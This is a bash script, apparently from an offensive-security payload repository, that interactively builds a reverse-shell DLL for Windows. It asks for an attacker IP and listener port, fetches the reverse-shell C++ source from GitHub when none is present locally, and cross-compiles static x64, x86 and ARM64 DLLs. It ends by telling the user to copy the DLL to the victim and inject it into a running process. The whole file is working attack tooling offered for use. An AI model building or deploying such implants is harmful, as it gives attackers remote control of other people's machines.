#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# build_revshell_dll.sh — interactive cross-compiler for revshell_pure_dll.dll
#
# Prompts for LHOST / LPORT (remembers your last answers in a .conf next to
# this script), shows a numbered arch menu (x64 / x86 / ARM64 / all), and
# writes revshell_<arch>.dll into reverse-shell/.
#
# - Uses mingw-w64 for x64/x86 (apt install mingw-w64 if missing).
# - Needs llvm-mingw for ARM64 (not in apt). The script prints the URL if
#   the ARM64 compiler isn't on PATH.
# - LHOST/LPORT substitution is done against a temp copy of the source, so
#   the committed .cpp is NEVER modified.
# ---------------------------------------------------------------------------

set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
CONF="$HERE/build_revshell_dll.conf"

# Source + output dir are discovered at runtime (see locate_source) so the
# script works both inside the repo and as a standalone download.
SRC=""
OUT_DIR=""

# Upstream URL for the .cpp — used when the script runs outside the repo and
# no local copy of the source is found.
SRC_URL="https://raw.githubusercontent.com/m14r41/PayloadEverything/main/thick-client/process-injection-2/reverse-shell/revshell_pure_dll.cpp"

# ---- defaults ----
DEF_LHOST="10.10.14.1"
DEF_LPORT="4444"

# load previous answers if the conf exists
LHOST=""; LPORT=""
[[ -f "$CONF" ]] && source "$CONF"
LAST_LHOST="${LHOST:-$DEF_LHOST}"
LPORT="${LPORT:-$DEF_LPORT}"

# ---- auto-detect this machine's current IP ----
# Prefer the IP that would be used to reach the internet (matches the
# interface attacker tools listen on by default). Falls back to hostname -I,
# then to the last-used / default.
detect_current_ip() {
    local ip
    ip="$(ip route get 1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -n1)"
    [[ -z "$ip" ]] && ip="$(hostname -I 2>/dev/null | awk '{print $1}')"
    [[ -z "$ip" ]] && ip="$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)"
    echo "$ip"
}

CURRENT_IP="$(detect_current_ip)"
# Pick the default to show in the prompt: prefer detected current IP, else
# last-used from the conf, else the hardcoded default.
if [[ -n "$CURRENT_IP" ]]; then
    LHOST_DEFAULT="$CURRENT_IP"
else
    LHOST_DEFAULT="$LAST_LHOST"
fi

# ---- colors (auto-off when stdout is not a TTY) ----
if [[ -t 1 ]]; then
    G='\033[92m'; R='\033[91m'; Y='\033[93m'; C='\033[96m'; B='\033[1m'; N='\033[0m'
else
    G=''; R=''; Y=''; C=''; B=''; N=''
fi

# ---- tool availability + auto-install ----
# Any apt package the script may rely on is installed here on first miss.
apt_install() {
    local pkg="$1"
    if dpkg -s "$pkg" >/dev/null 2>&1; then return 0; fi
    echo -e "${Y}[*]${N} installing apt package : ${C}$pkg${N}"
    sudo apt-get update -qq >/dev/null 2>&1 || true
    sudo apt-get install -y "$pkg"
}

# curl OR wget — for source/llvm-mingw downloads
ensure_downloader() {
    if command -v curl >/dev/null 2>&1; then return 0; fi
    if command -v wget >/dev/null 2>&1; then return 0; fi
    echo -e "${Y}[*]${N} no downloader found (curl/wget); installing curl"
    apt_install curl
}

# tar + xz — for the llvm-mingw archive
ensure_archive_tools() {
    command -v tar >/dev/null 2>&1 || apt_install tar
    command -v xz  >/dev/null 2>&1 || apt_install xz-utils
}

# mingw-w64 for x64/x86 cross-compile
ensure_mingw() {
    if command -v x86_64-w64-mingw32-g++ >/dev/null 2>&1 \
       && command -v i686-w64-mingw32-g++ >/dev/null 2>&1; then
        return 0
    fi
    apt_install mingw-w64
}

# ---- llvm-mingw (for ARM64 cross-compile) ----
# Not in apt. Download + extract to ~/.local/opt/llvm-mingw on first use and
# add it to ~/.bashrc so later sessions already have it on PATH.
LLVM_MINGW_VER="20231031"
LLVM_MINGW_TAR="llvm-mingw-${LLVM_MINGW_VER}-ucrt-ubuntu-20.04-x86_64.tar.xz"
LLVM_MINGW_URL="https://github.com/mstorsjo/llvm-mingw/releases/download/${LLVM_MINGW_VER}/${LLVM_MINGW_TAR}"
LLVM_MINGW_DIR="$HOME/.local/opt/llvm-mingw"

ensure_llvm_mingw() {
    # 1) already on PATH?
    if command -v aarch64-w64-mingw32-g++ >/dev/null 2>&1; then
        return 0
    fi
    # 2) previously downloaded by this script?
    if [[ -x "$LLVM_MINGW_DIR/bin/aarch64-w64-mingw32-g++" ]]; then
        export PATH="$LLVM_MINGW_DIR/bin:$PATH"
        echo -e "${G}[+]${N} using cached llvm-mingw at ${C}$LLVM_MINGW_DIR${N}"
        return 0
    fi

    ensure_downloader
    ensure_archive_tools

    echo -e "${Y}[*]${N} llvm-mingw needed for ARM64 — downloading (~90 MB, one-time)"
    echo -e "       ${C}$LLVM_MINGW_URL${N}"

    mkdir -p "$LLVM_MINGW_DIR"
    local tmp_tar; tmp_tar="$(mktemp --suffix=.tar.xz)"
    local tmp_dir; tmp_dir="$(mktemp -d)"

    if command -v curl >/dev/null 2>&1; then
        curl -fL# "$LLVM_MINGW_URL" -o "$tmp_tar" || { echo -e "${R}[!]${N} download failed"; rm -rf "$tmp_tar" "$tmp_dir"; return 1; }
    else
        wget --show-progress -q "$LLVM_MINGW_URL" -O "$tmp_tar" || { echo -e "${R}[!]${N} download failed"; rm -rf "$tmp_tar" "$tmp_dir"; return 1; }
    fi

    echo -e "${Y}[*]${N} extracting ..."
    tar -xf "$tmp_tar" -C "$tmp_dir"
    local unpacked; unpacked="$(find "$tmp_dir" -maxdepth 1 -mindepth 1 -type d | head -n1)"
    [[ -z "$unpacked" ]] && { echo -e "${R}[!]${N} unexpected archive layout"; rm -rf "$tmp_tar" "$tmp_dir"; return 1; }

    cp -a "$unpacked/." "$LLVM_MINGW_DIR/"
    rm -rf "$tmp_tar" "$tmp_dir"

    if [[ ! -x "$LLVM_MINGW_DIR/bin/aarch64-w64-mingw32-g++" ]]; then
        echo -e "${R}[!]${N} install failed (compiler binary not found after extract)"
        return 1
    fi

    export PATH="$LLVM_MINGW_DIR/bin:$PATH"
    echo -e "${G}[+]${N} llvm-mingw installed at ${C}$LLVM_MINGW_DIR${N}"

    # Persist for future shells
    local bashrc="$HOME/.bashrc"
    local pathline="export PATH=\"$LLVM_MINGW_DIR/bin:\$PATH\"  # llvm-mingw (ARM64 cross-compile)"
    if [[ -f "$bashrc" ]] && ! grep -Fq "$LLVM_MINGW_DIR/bin" "$bashrc"; then
        printf '\n%s\n' "$pathline" >> "$bashrc"
        echo -e "${G}[+]${N} added to ~/.bashrc (new shells pick it up automatically)"
    fi
}

download_source() {
    # $1 = destination path
    local dest="$1"
    ensure_downloader
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "$SRC_URL" -o "$dest"
    else
        wget -q "$SRC_URL" -O "$dest"
    fi
}

locate_source() {
    # 1) in-repo layout : <here>/reverse-shell/revshell_pure_dll.cpp
    if [[ -f "$HERE/reverse-shell/revshell_pure_dll.cpp" ]]; then
        SRC="$HERE/reverse-shell/revshell_pure_dll.cpp"
        OUT_DIR="$HERE/reverse-shell"
        echo -e "${G}[+]${N} source : ${C}$SRC${N}  (in-repo)"
        return 0
    fi
    # 2) standalone : .cpp sits next to the script
    if [[ -f "$HERE/revshell_pure_dll.cpp" ]]; then
        SRC="$HERE/revshell_pure_dll.cpp"
        OUT_DIR="$HERE"
        echo -e "${G}[+]${N} source : ${C}$SRC${N}  (standalone)"
        return 0
    fi
    # 3) not present anywhere — download it next to the script
    echo -e "${Y}[*]${N} source .cpp not found locally"
    echo -e "${Y}[*]${N} downloading from ${C}$SRC_URL${N} ..."
    local dest="$HERE/revshell_pure_dll.cpp"
    if download_source "$dest"; then
        # basic sanity check on the download
        if grep -q 'LHOST' "$dest" 2>/dev/null; then
            SRC="$dest"
            OUT_DIR="$HERE"
            local bytes; bytes="$(stat -c '%s' "$dest" 2>/dev/null || wc -c < "$dest")"
            echo -e "${G}[+]${N} downloaded : ${C}$SRC${N}  (${bytes} bytes)"
            return 0
        else
            echo -e "${R}[!]${N} downloaded file doesn't look like the source (no LHOST marker)"
            rm -f "$dest"
            return 1
        fi
    fi
    return 1
}

banner() {
    echo
    echo -e "${G}${B}================================================================${N}"
    echo -e "${G}${B}  revshell_pure_dll.dll  —  interactive cross-compiler${N}"
    echo -e "${G}${B}================================================================${N}"
    echo
}

prompt() {
    # $1 = label, $2 = default
    local v
    read -r -p "$(echo -e "${Y}?${N} $1 [${C}$2${N}]: ")" v
    echo "${v:-$2}"
}

check_prereq_mingw()      { ensure_mingw;      }
check_prereq_llvm_mingw() { ensure_llvm_mingw; }

compiler_for() {
    case "$1" in
        x64)   echo "x86_64-w64-mingw32-g++" ;;
        x86)   echo "i686-w64-mingw32-g++"   ;;
        arm64) echo "aarch64-w64-mingw32-g++" ;;
    esac
}

build_one() {
    local arch="$1"
    local out="$OUT_DIR/revshell_${arch}.dll"
    local tmp; tmp="$(mktemp --suffix=.cpp)"
    trap "rm -f '$tmp'" RETURN

    # Substitute LHOST/LPORT in a temp copy only (committed source untouched).
    sed -e "s|LHOST = \"[^\"]*\"|LHOST = \"$LHOST\"|" \
        -e "s|LPORT = [0-9][0-9]*|LPORT = $LPORT|" \
        "$SRC" > "$tmp"

    local cxx; cxx="$(compiler_for "$arch")"

    echo
    echo -e "${G}[+]${N} building  ${C}$arch${N}  ->  ${C}$out${N}"
    echo -e "    LHOST=${C}$LHOST${N}  LPORT=${C}$LPORT${N}  compiler=${C}$cxx${N}"

    # -static / -static-libgcc / -static-libstdc++  : link MinGW runtime in,
    #   so the DLL does not need libgcc_s_seh-1.dll or libstdc++-6.dll on
    #   the victim (without this the DLL loads but background threads die
    #   silently — classic "DLL loads but no shell lands" symptom).
    # -fno-exceptions / -fno-rtti : trim ~20 KB of unused C++ metadata.
    if "$cxx" -shared -O2 -s \
              -static -static-libgcc -static-libstdc++ \
              -fno-exceptions -fno-rtti \
              -o "$out" "$tmp" -lws2_32 \
              -Wl,--subsystem,windows,--kill-at; then
        local bytes; bytes="$(stat -c '%s' "$out" 2>/dev/null || wc -c < "$out")"
        echo -e "    ${G}${B}ok${N}  $(printf '%d' "$bytes") bytes"
    else
        echo -e "    ${R}${B}fail${N}"
        return 1
    fi
}

save_conf() {
    cat > "$CONF" <<EOF
# written by build_revshell_dll.sh — edit or delete freely
LHOST="$LHOST"
LPORT="$LPORT"
EOF
}

main() {
    banner
    locate_source || { echo -e "${R}[!]${N} cannot proceed without the source .cpp"; exit 1; }
    echo -e "${G}[+]${N} output : ${C}$OUT_DIR/revshell_<arch>.dll${N}"

    # Show what we found so the user understands where the default comes from
    if [[ -n "$CURRENT_IP" ]]; then
        echo -e "${G}[+]${N} current IP detected : ${C}$CURRENT_IP${N}  (press Enter to use)"
    else
        echo -e "${Y}[*]${N} could not auto-detect an IP on this machine"
    fi
    if [[ "$LAST_LHOST" != "$LHOST_DEFAULT" && "$LAST_LHOST" != "$DEF_LHOST" ]]; then
        echo -e "${Y}[*]${N} last used           : ${C}$LAST_LHOST${N}  (type it to reuse)"
    fi

    LHOST="$(prompt "LHOST (attacker IP)" "$LHOST_DEFAULT")"
    LPORT="$(prompt "LPORT (listener port)" "$LPORT")"

    echo
    echo "Pick architecture:"
    echo -e "  ${C}1${N})  x64    (AMD64 — 99% of modern Windows targets)"
    echo -e "  ${C}2${N})  x86    (32-bit / WOW64 — legacy apps)"
    echo -e "  ${C}3${N})  ARM64  (Surface Pro X, newer ARM laptops)"
    echo -e "  ${C}4${N})  all three"
    choice="$(prompt "choice" "1")"

    case "$choice" in
        1) ARCHES=(x64)              ;;
        2) ARCHES=(x86)              ;;
        3) ARCHES=(arm64)            ;;
        4) ARCHES=(x64 x86 arm64)    ;;
        *) echo -e "${R}[!]${N} invalid choice"; exit 1 ;;
    esac

    # install cross-compilers as needed
    for a in "${ARCHES[@]}"; do
        case "$a" in
            x64|x86) check_prereq_mingw ;;
            arm64)   check_prereq_llvm_mingw || exit 1 ;;
        esac
    done

    for a in "${ARCHES[@]}"; do
        build_one "$a"
    done

    save_conf

    echo
    echo -e "${G}${B}[+] done${N}  (settings saved to ${C}$CONF${N})"
    ls -lh "$OUT_DIR"/revshell_*.dll 2>/dev/null | sed 's/^/    /' || true
    echo
    echo -e "${Y}next:${N}  copy the .dll(s) to the victim; then on victim run:"
    echo -e "        ${C}pop_x64.exe <PID> --dll revshell_x64.dll${N}"
    echo -e "        (pop auto-switches to revshell_x86.dll if target is 32-bit)"
    echo
}

main "$@"
